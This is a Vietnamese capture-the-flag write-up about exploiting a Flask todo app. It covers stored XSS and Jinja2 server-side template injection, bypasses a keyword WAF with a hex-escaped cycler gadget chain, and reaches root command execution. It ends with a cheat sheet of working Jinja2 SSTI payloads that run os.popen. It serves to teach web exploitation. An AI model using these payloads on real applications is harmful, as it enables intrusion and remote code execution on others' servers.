

---
Tài liệu/Bài báo tham khảo:

SSTI cheat-sheet: https://github.com/l1ackersalman/Bug-Hunting-Cheatsheet/blob/main/SSTI.md
https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html
https://www.youtube.com/watch?v=SN6EVIG4c-0

---

![[Pasted image 20261015115341.png]]

Thêm task mới chỉ đơn giản là gửi một POST request đến server với body bao gồm todo=`<input>`

![[Pasted image 20261015115605.png]]


XSS có thể trigger thành công:
![[Pasted image 20261015115708.png]]
![[Pasted image 20261015115720.png]]

Đây là thậm chí dạng stored XSS ứng với mỗi session của người dùng 😀
Mình đã thử thêm một script fetch() xem có ip nào lạ xem được todo list của mình không nhưng không có🤔


Server này là server python được xây dựng bằng Flask/Werkzeug
![[Pasted image 20261015120659.png]]

cookie có dấu chấm ở đầu nên được nén bởi zlib:
.eJyrVirJT8kvVrKKVkosTszKTixW0lGyKU4uyiwosVNIzEktKtEw1FSw0YcKEZCNrQUATm4aqA.atBdLQ.FhfffmRHRAWqg95RZKRip8f1wmo

Mình thử giải nén ra xem có những gì:
![[Pasted image 20261015121038.png]]

Không thấy gì đặc biết lắm, nếu gặp token không hợp lệ server tự cấp token mới. Nên mình chuyển sang hướng khác, test thử SSTI, ai ngờ được thật 😀 
![[Pasted image 20261015171058.png]]

![[Pasted image 20261015171628.png]]

Sau khi test thì mình biết đây là Jinja. Mình thử exploit bằng payload `{{ config }}` thì gặp 'hack detected':
![[Pasted image 20261015171741.png]]


Thử thêm một vài cách nữa mà vẫn không thành công nên mình quyết định dùng SSTImap để automate quá trình exploit:

![[Pasted image 20261015175154.png]]
Tool phát hiện được nhưng không exploit được, thế là mình lại phải làm thủ công 🥱


Mình nhờ AI viết script nho nhỏ để check xem WAF chặn gì:
![[Pasted image 20261015175816.png]]

Test thêm một lúc thì WAF dường như chỉ chặn ở tầng keyword. Mình exploit thành công sử dụng payload:
`{{cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('o'+'s')|attr('po'+'pen')('<PAYLOAD>')|attr('read')()}}`

Giải thích payload:
Để hiểu cơ chế thì bạn có thể tham khảo video này, giải thích cực kì dễ hiểu kaka: https://www.youtube.com/watch?v=SN6EVIG4c-0
Nói đơn giản thì do WAF của app đã chặn lấy shell trực tiếp nên mình cần tìm cách nào đó để lấy shell một cách lươn lẹo bằng các gadget có sẵn kaka

- Cycler: Một class được import trong Jinja2, có rất nhiều lựa chọn khác nữa mọi người cứ test nhé, làm sao để đến được mấy cái nguy hiểm như `os`, `subprocess`, `__builtins__.__import__`, `__subclasses__`, `pty`... là được
 ![[Pasted image 20261015210742.png]]
![[Pasted image 20261015211359.png]]

- Mấy cái như kiểu '\x5f\x5finit\x5f\x5f' trông thì ghê nhưng bạn dán vào python sẽ thấy nó chỉ là string bình thường để né WAF thôi hehe.
- ![[Pasted image 20261015212235.png]]
- Sau đó mình dùng getattr để lấy  `__init__` của Cycler, cứ như thế mình leo được lên os và chèn shell thành công!
![[Pasted image 20261015180316.png]]

![[Pasted image 20261015181047.png]]
Mình được đăng nhập ở quyền root luôn 😀


Mình nhờ AI làm cái shell pha-ke bằng cách gửi request và lấy response bằng payload vừa tìm được do máy chủ challenge không được kết nối với Internet ngoài nên không chèn reverse shell được:))
![[Pasted image 20261015181515.png]]


Mình cat requirements.txt thì được mà cat cái khác thì không, WAF khá ảo 😅
![[Pasted image 20261015182649.png]]

![[Pasted image 20261015182925.png]]

Hmm mình không ngờ WAF chặt vậy :))
![[Pasted image 20261015183450.png]]

![[Pasted image 20261015183839.png]]

Cuối cùng mình thử đơn giản lại thành công :)) Troll troll vn

![[Pasted image 20261015184349.png]]

![[Pasted image 20261015184443.png]]
![[Pasted image 20261015184548.png]]


Cheatsheet mình nhờ AI tạo để lần sau tiện tra cứu:
```
# === JINJA2 DEFAULT GLOBALS ===
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}
{{lipsum.__globals__.os.popen('id').read()}}
{{range.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{dict.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}

# === FLASK INJECTED GLOBALS ===
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{session.__class__.__init__.__globals__['os'].popen('id').read()}}
{{g.__class__.__init__.__globals__['os'].popen('id').read()}}
{{url_for.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read()}}

# === RUNTIME ===
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}

# === SUBCLASSES (khi không có global nào dùng được) ===
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['os'].popen('id').read()}}
```
